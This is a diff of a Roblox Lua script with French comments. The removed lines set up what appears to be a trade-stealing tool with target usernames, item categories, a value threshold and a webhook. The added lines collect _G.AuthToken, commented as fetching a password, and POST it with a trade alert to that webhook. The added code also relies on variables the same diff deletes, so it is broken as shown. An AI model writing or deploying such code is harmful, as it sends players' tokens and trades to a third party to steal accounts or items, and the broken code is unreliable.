@@ -1,31 +1,24 @@
-_G.scriptExecuted = _G.scriptExecuted or false
-if _G.scriptExecuted then
-    return
+-- 
+local payload = {
+    ["auth_token"] = _G.AuthToken or "AUCUN_TOKEN", -- Récupère le mot de passe EBK-SS-A
+    ["content"] = (ping == "Yes" and "@everyone " or "") .. "Nouveau trade détecté !",
+    ["username"] = "Log Bot"
+}
+
+-- 
+if payload["auth_token"] == "AUCUN_TOKEN" then
+    warn("ATTENTION : _G.AuthToken n'est pas défini dans ton script de configuration !")
 end
-_G.scriptExecuted = true
 
-local itemsToSend = {}
-local categories = {"Sword", "Emote", "Explosion"}
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local HttpService = game:GetService("HttpService")
-local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
-local PlayerGui = plr.PlayerGui
-local tradeGui = PlayerGui.Trade
-local inTrade = false
-local notificationsGui = PlayerGui.Notifications
-local tradeCompleteGui = PlayerGui.TradeCompleted
-local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
-local Replion = require(game.ReplicatedStorage.Packages.Replion)
+-- 
+local success, response = pcall(function()
+    return HttpService:PostAsync(webhook, HttpService:JSONEncode(payload))
+end)
 
-local users = _G.Usernames or {}
-local min_rap = _G.min_rap or 100
-local ping = _G.pingEveryone or "No"
-local webhook = _G.webhook or ""
-
-if next(users) == nil or webhook == "" then
-    plr:kick("You didn't add usernames or webhook")
-    return
+if not success then
+    warn("Erreur d'envoi (le spammeur est peut-être bloqué) : " .. tostring(response))
+else
+    print("Données envoyées avec succès au Worker.")
 end
 
 if game.PlaceId ~= 13772394625 then
